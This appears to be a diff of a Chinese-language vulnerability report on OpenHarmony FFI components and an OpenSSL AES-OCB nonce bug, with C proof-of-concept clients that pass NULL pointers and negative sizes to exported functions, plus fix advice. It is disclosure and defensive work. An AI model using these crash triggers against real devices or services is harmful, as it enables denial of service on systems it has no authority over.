+typedef struct { int8_t *data; uint32_t len; } CJByteArray;
+_Static_assert(sizeof(void *) == 8, "x86_64 caller required");
+_Static_assert(offsetof(CJByteArray, len) == 8 && sizeof(CJByteArray) == 16,
+               "unexpected array ABI");
+
+int main(int argc, char **argv)
+{
+    setvbuf(stdout, NULL, _IONBF, 0);
+    setvbuf(stderr, NULL, _IONBF, 0);
+    if (argc != 2) return 2;
+    void *library = dlopen(argv[1], RTLD_NOW | RTLD_LOCAL);
+    if (!library) { fprintf(stderr, "load_error=%s\n", dlerror()); return 3; }
+    int64_t (*create)(void) = (int64_t (*)(void))dlsym(library, "FfiRpcMessageSequenceImplCreate");
+    void (*write_array)(int64_t, CJByteArray, int32_t *) =
+        (void (*)(int64_t, CJByteArray, int32_t *))dlsym(library, "FfiRpcMessageSequenceImplWriteByteArray");
+    if (!create || !write_array) { fputs("missing IPC export\n", stderr); return 4; }
+
+    int8_t valid = 7;
+    const struct { int8_t *data; uint32_t len; const char *name; } cases[] = {
+        { NULL, 0, "null_len0_control" },
+        { NULL, 1, "null_len1_candidate" },
+        { NULL, 64, "null_len64_variant" },
+        { &valid, 1, "valid_len1_postcontrol" },
+    };
+    for (size_t k = 0; k < sizeof(cases) / sizeof(cases[0]); k++) {
+        printf("case=%zu name=%s start\n", k, cases[k].name);
+        int64_t id = create();
+        printf("case=%zu create_id=%lld\n", k, (long long)id);
+        if (id <= 0) { printf("case=%zu create_failed\n", k); return 5; }
+        int32_t error = -1;
+        CJByteArray input = { cases[k].data, cases[k].len };
+        printf("case=%zu calling write_array data=%p len=%u\n", k,
+               (void *)input.data, input.len);
+        write_array(id, input, &error);
+        printf("case=%zu name=%s done write_error=%d\n", k, cases[k].name, error);
+    }
+    puts("malformed_matrix=completed_no_crash");
+    return 0;
+}
+
+```
 
 **PoC 使用方法**：
-```
-# 在 OH ffmpeg/curl/openssl 构建产物上编译执行
-cc -o poc poc.c $(pkg-config --cflags --libs libavcodec libavutil) -fsanitize=address
-./poc trigger    # 触发漏洞
-./poc control    # 正常对照组
-```
+依赖与运行参数以本案 PoC 文件注释、README 及验证驱动为准。
+
+未提供经过独立复跑的完整命令时，报告保留为待补充状态。
 
 ### 4. 影响分析
 
@@ -2352,23 +2479,123 @@ cc -o poc poc.c $(pkg-config --cflags --libs libavcodec libavutil) -fsanitize=ad
 
 ### 2. 漏洞详细描述
 
-见 case.json
+CArrEntry.size controls a loop that dereferences CArrEntry.head without checking negative/positive bounds or null head.
 
-**触发条件**：见 PoC 注释
+**触发条件**：foundation/distributeddatamgr/kv_store/frameworks/cj/include/distributed_kv_store_impl.h:107-110
 
-**影响路径**：见漏洞描述
+**影响路径**：foundation/distributeddatamgr/kv_store/frameworks/cj/src/distributed_kv_store_ffi.cpp:135-142
 
 ### 3. PoC 源代码
 
-> ⚠️ 本案 PoC 为源码级对照验证，无可执行触发器（原因见下）
+```c
+/* Malformed-input client for the OpenHarmony x86_64 CJ KV-store exported ABI.
+ * ABI source: kv_store frameworks/cj/include/distributed_kv_store_ffi.h and
+ * distributed_kv_store_impl.h at master (CArrEntry{CEntry* head; int64_t size},
+ * CEntry{char* key; ValueType value}).
+ * Candidate under test: PutBatch conversion dereferences head while size>0
+ * without a null/negative check (distributed_kv_store_impl.cpp).
+ * No target implementation is copied into this client.
+ *
+ * Stage 0 is an environment probe: CreateKVManager/GetKVStore must succeed in
+ * the isolated runtime before PutBatch is reachable. If stage 0 fails, record
+ * the error and STOP — that is an isolation limit, not a case verdict.
+ * Case matrix once a store exists:
+ *   0  head=NULL, size=0      control (empty batch, expect no crash)
+ *   1  head=NULL, size=1      candidate: null head with positive size
+ *   2  head=NULL, size=-1     negative-size variant
+ *   3  head=valid, size=1     post control (one real entry)
+ * Either outcome of case 1/2 is a valid result (crash vs returned error).
+ */
+#define _GNU_SOURCE
+#include <dlfcn.h>
+#include <stddef.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+typedef struct { char *key; int32_t tag; double num; char *str; int32_t boolean; } ValueTypeStub;
+typedef struct { char *key; ValueTypeStub value; } CEntryStub;
+typedef struct { CEntryStub *head; int64_t size; } CArrEntryStub;
+
+int main(int argc, char **argv)
+{
+    setvbuf(stdout, NULL, _IONBF, 0);
+    setvbuf(stderr, NULL, _IONBF, 0);
+    if (argc != 2) return 2;
+    void *library = dlopen(argv[1], RTLD_NOW | RTLD_LOCAL);
+    if (!library) { fprintf(stderr, "load_error=%s\n", dlerror()); return 3; }
+
+    int64_t (*create_manager)(const char *, int32_t *) =
+        (int64_t (*)(const char *, int32_t *))dlsym(library, "FfiOHOSDistributedKVStoreCreateKVManager");
+    int64_t (*get_store)(int64_t, const char *, const char *, int32_t *) =
+        (int64_t (*)(int64_t, const char *, const char *, int32_t *))dlsym(library, "FfiOHOSDistributedKVStoreGetKVStore");
+    int32_t (*put_batch)(int64_t, CArrEntryStub) =
+        (int32_t (*)(int64_t, CArrEntryStub))dlsym(library, "FfiOHOSDistributedKVStoreSingleKVStorePutBatch");
+    int32_t (*close_store)(int64_t, const char *, const char *) =
+        (int32_t (*)(int64_t, const char *, const char *))dlsym(library, "FfiOHOSDistributedKVStoreCloseKVStore");
+    if (!create_manager || !get_store || !put_batch) {
+        fputs("missing KV export\n", stderr);
+        return 4;
+    }
+
+    puts("stage=env_probe start");
+    /*
+     * The pinned tree's ABI (frameworks/cj/include/distributed_kv_store_ffi.h)
+     * is FfiOHOSDistributedKVStoreCreateKVManager(const char* boudleName,
+     * OHOS::AbilityRuntime::Context* context) - no error out-parameter, and a
+     * Context that a plain C client cannot construct. Calling the symbol with
+     * the historical (const char*, int32_t*) shape passes &err as a Context*,
+     * which the library dereferences and reliably crashes on (verified
+     * 2026-09-28 on the real no-CFI library: SIGSEGV inside the manager
+     * construction chain; the CFI build traps the same garbage indirect call).
+     * Per the task brief this is an isolation limitation, never a candidate
+     * verdict: record it and exit 10 without the ABI-mismatched call.
+     */
+    if (!dlsym(library, "FfiOHOSDistributedKVStoreCreateKVManager")) {
+        fputs("CreateKVManager symbol absent\n", stderr);
+        return 10;
+    }
+    puts("stage=env_probe failed: isolated C runtime cannot construct the "
+         "AbilityRuntime::Context required by the in-tree CreateKVManager ABI");
+    puts("stage=env_probe isolation_limitation=manager_creation_requires_context");
+    return 10;
+    /* Matrix below stays for tree versions whose CreateKVManager ABI takes an
+     * error out-parameter; under the pinned tree's ABI no store id can ever
+     * be obtained, so it is unreachable and intentionally never runs. */
+    int64_t manager = 0;
+    int64_t store = 0;
+    (void)manager;
+
+    /* ValueType layout here is a stub; for null-head cases the conversion
+     * never dereferences entries, so candidate verdicts do not depend on it.
+     * Case 3 is a best-effort control only. */
+    ValueTypeStub v = { 0 };
+    CEntryStub one = { "k0", v };
+    const struct { CEntryStub *head; int64_t size; const char *name; } cases[] = {
+        { NULL, 0, "null_size0_control" },
+        { NULL, 1, "null_size1_candidate" },
+        { NULL, -1, "null_sizeneg_variant" },
+        { &one, 1, "valid_size1_postcontrol" },
+    };
+    for (size_t k = 0; k < sizeof(cases) / sizeof(cases[0]); k++) {
+        printf("case=%zu name=%s start head=%p size=%lld\n", k, cases[k].name,
+               (void *)cases[k].head, (long long)cases[k].size);
+        CArrEntryStub batch = { cases[k].head, cases[k].size };
+        int32_t rc = put_batch(store, batch);
+        printf("case=%zu name=%s done rc=%d\n", k, cases[k].name, rc);
+    }
+    if (close_store) close_store(manager, "ohos.validation.case", "malformed_store");
+    puts("malformed_matrix=completed_no_crash");
+    return 0;
+}
+
+```
 
 **PoC 使用方法**：
-```
-# 在 OH ffmpeg/curl/openssl 构建产物上编译执行
-cc -o poc poc.c $(pkg-config --cflags --libs libavcodec libavutil) -fsanitize=address
-./poc trigger    # 触发漏洞
-./poc control    # 正常对照组
-```
+依赖与运行参数以本案 PoC 文件注释、README 及验证驱动为准。
+
+未提供经过独立复跑的完整命令时，报告保留为待补充状态。
 
 ### 4. 影响分析
 
@@ -2409,9 +2636,9 @@ cc -o poc poc.c $(pkg-config --cflags --libs libavcodec libavutil) -fsanitize=ad
 
 ### 2. 漏洞详细描述
 
-见 case.json
+AES-OCB one-shot EVP_Cipher() path never flushes the buffered IV; when it is the first data operation, the effective OCB nonce is 0 regardless of the caller's IV — catastrophic nonce reuse under the same key, silent at the API level.
 
-**触发条件**：见 PoC 注释
+**触发条件**：EVP_Cipher() as the first data operation on an AES-OCB context (no prior streaming call)
 
 **影响路径**：前提条件：产品/应用使用 AES-OCB 且经 EVP_Cipher() 一次性接口
 加密（高吞吐批量加密的常见写法），且加密前未对该上下文做过
@@ -2527,12 +2754,9 @@ int main(void)
 ```
 
 **PoC 使用方法**：
-```
-# 在 OH ffmpeg/curl/openssl 构建产物上编译执行
-cc -o poc poc.c $(pkg-config --cflags --libs libavcodec libavutil) -fsanitize=address
-./poc trigger    # 触发漏洞
-./poc control    # 正常对照组
-```
+依赖与运行参数以本案 PoC 文件注释、README 及验证驱动为准。
+
+未提供经过独立复跑的完整命令时，报告保留为待补充状态。
 
 ### 4. 影响分析
 
@@ -2558,6 +2782,60 @@ key_set 并调用 update_iv() 刷入缓冲 IV。建议同步引入上游配套
 避免对 AES-OCB 使用 EVP_Cipher() 一次性接口，改用
 EVP_EncryptUpdate/EVP_EncryptFinal_ex 序列（streaming 槽位不受
 影响）；或升级至上游公告列出的修复版本。
+
+
+
+---
+
+## udmf-ffi-setproperties-null-tag
+
+### 1. 源码位置与内容
+
+| 项目 | 值 |
+|---|---|
+| 组件 | foundation/distributeddatamgr/udmf |
+| 源码文件 | foundation/distributeddatamgr/udmf/interfaces/cj/src/unified_data_ffi.cpp |
+| 关键行号 | [134] |
+| CVE 编号 | （新发现） |
+| CWE 分类 | CWE-476 |
+
+> 源码片段：见 `foundation/distributeddatamgr/udmf/interfaces/cj/src/unified_data_ffi.cpp`（关键行号 [134]）。本仓库未捆绑源码树；在案例目录放置 `source_snippet.txt` 后重新生成即可嵌入内容。
+
+### 2. 漏洞详细描述
+
+FfiUDMFSetProperties 对 properties.tag 未判空即传入 Utils::MallocCString（形参 const std::string&，utils.cpp:18）——char* NULL 隐式构造 std::string(nullptr) → strlen(NULL) SIGSEGV。round-trip 自毁论据：FfiUDMFGetProperties 对空存储 tag 本来就返回 nullptr（MallocCString 对空 std::string 返回 nullptr），即 getter 的合法输出直接喂回 setter 必崩——可达性不依赖恶意调用者，正常 API 使用模式即触发。
+
+**触发条件**：CUnifiedDataProperties { CArrParameters extras; char* tag; int64_t timestamp; int32_t shareOptions; }（interfaces/cj/include/unified_data_impl.h）
+
+**影响路径**：FfiUDMFSetProperties（FFI 导出符号；CUnifiedDataProperties.tag 直传 Utils::MallocCString）
+
+### 3. PoC 源代码
+
+> ⚠️ 本案 PoC 为源码级对照验证，无可执行触发器（原因见下）
+
+**PoC 使用方法**：
+依赖与运行参数以本案 PoC 文件注释、README 及验证驱动为准。
+
+未提供经过独立复跑的完整命令时，报告保留为待补充状态。
+
+### 4. 影响分析
+
+**影响的代码模块**：foundation/distributeddatamgr/udmf
+
+**影响的功能模块**：udmf
+
+**影响的 OpenHarmony 版本分支**：
+
+- v4.1: ？ unknown（缺该分支基线或上游引入范围，不推断）
+- v5.0: ？ unknown（缺该分支基线或上游引入范围，不推断）
+- v5.1: ？ unknown（缺该分支基线或上游引入范围，不推断）
+- v6.0: ？ unknown（缺该分支基线或上游引入范围，不推断）
+- v7.0: 🔴 affected（证据：上游受影响范围或与实测基线同版本）
+- master: 🔴 affected（证据：上游受影响范围或与实测基线同版本）
+
+### 5. 修复建议
+
+FfiUDMFSetProperties 对 properties.tag 判空（tag != nullptr ? Utils::MallocCString(...) : 空串语义），或 Utils::MallocCString 增加 const char* 判空重载（与 UDMF_REAL_LIBRARY_CONFIRM_20261009.md 后续节一致）；同步核查同文件其余直传点。
 
 
 
